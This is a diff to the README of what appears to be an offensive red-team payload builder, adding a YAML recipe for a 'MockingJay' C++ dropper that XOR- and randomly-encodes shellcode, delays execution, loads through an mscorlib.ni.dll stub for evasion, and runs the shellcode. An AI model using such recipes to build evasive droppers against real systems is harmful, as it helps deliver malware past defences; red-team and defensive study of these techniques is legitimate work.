@@ -20,6 +20,7 @@
     * [CPP](#cpp)
       * [Dropper](#dropper)
       * [Injector](#injector)
+      * [MockingJay](#mockingjay)
     * [PowerShell](#powershell)
       * [ScriptBlockSmuggling](#scriptblocksmuggling)
     * [CSharp](#csharp)
@@ -294,6 +295,32 @@ Or get assemblyInfo from DB
       name: Execute shellcode
 ```
 
+#### MockingJay
+
+```yaml
+- !codewriter.cpp
+  &code
+  name: Generate MockingJay dropper
+  functions: dynamic
+  output_type: exe
+  payload_placement: data
+  decoders:
+    - *xor
+    - *rndb
+    - *rndf
+  blocks:
+    - !cpp.delay
+      name: Delay execution
+      seconds: 5
+
+    - !cpp.mockingjay
+      name: Generate mockingjay stub
+      library: mscorlib.ni.dll
+
+    - !cpp.drop
+      name: Execute shellcode
+```
+
 ### PowerShell
 
 #### ScriptBlockSmuggling
@@ -531,3 +558,4 @@ Get an argument from cmdline
 * [https://github.com/Aetsu/OffensivePipeline](OffensivePipeline)
 * [https://github.com/klezVirus/inceptor](inceptor)
 * [https://github.com/PowerShellMafia/PowerSploit](PowerSploit)
+* [https://github.com/caueb/Mockingjay](MockingJay)
